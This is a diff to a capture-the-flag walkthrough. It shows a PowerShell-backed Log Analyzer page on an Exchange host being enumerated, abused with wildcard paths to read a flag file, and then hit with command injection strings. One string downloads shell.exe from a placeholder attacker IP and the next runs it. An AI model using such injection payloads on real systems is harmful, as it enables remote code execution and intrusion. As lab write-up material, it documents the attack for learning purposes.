@@ -55,20 +55,22 @@ Directory enumeration was performed on port 80 using ffuf. The scan only reveale
 A separate HTTPS directory scan was then performed against the Exchange hostname. This revealed `/test`, an authenticated development interface that was not discovered during the HTTP scan.
 
 <img width="1331" height="1593" alt="image" src="https://github.com/user-attachments/assets/e51d6157-4038-4dd7-bdd7-3430c589ca4a" />
-
+<br>
 I checked and got the first question flag:
 
 <img width="1915" height="342" alt="image" src="https://github.com/user-attachments/assets/a89ddde8-abaa-4ef8-ac8b-1ff17f43bb48" />
-
+<br>
 Then I tried to type something in that box and click run:
 
 <img width="868" height="241" alt="image" src="https://github.com/user-attachments/assets/ffd80716-2a23-4c93-a92d-33b29fa9a86b" />
+<br>
 
 This error is very useful, It tells us the backend is running PowerShell:
 ```
 Get-Content('C:\Users\Administrator\Desktop\user.txt')
 ```
-So this Log Analyzer is reading files using Get-Content. Your path worked as input, but the file path doesn’t exist.
+
+So this Log Analyzer is reading files using `Get-Content`. The path worked as input, but the file path doesn’t exist.
 Then I tested whether PowerShell wildcards were supported in the path input. Using `C:\Users\*\Desktop\user.txt`, the application expanded the wildcard across user profile directories and eventually disclosed the Second question user flag.
 
 <img width="878" height="507" alt="image" src="https://github.com/user-attachments/assets/d3b0b20f-f547-4563-9847-99ca4784b862" />
@@ -130,7 +132,7 @@ Trigger from Log Analyzer:
 ```
 '); powershell -c "iwr http://YOUR_VPN_IP:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe"; #
 ```
-In Log Analyzer — execute payload
+In Log Analyzer on the web app — execute payload
 ```
 '); C:\Windows\Temp\shell.exe; #
 ```
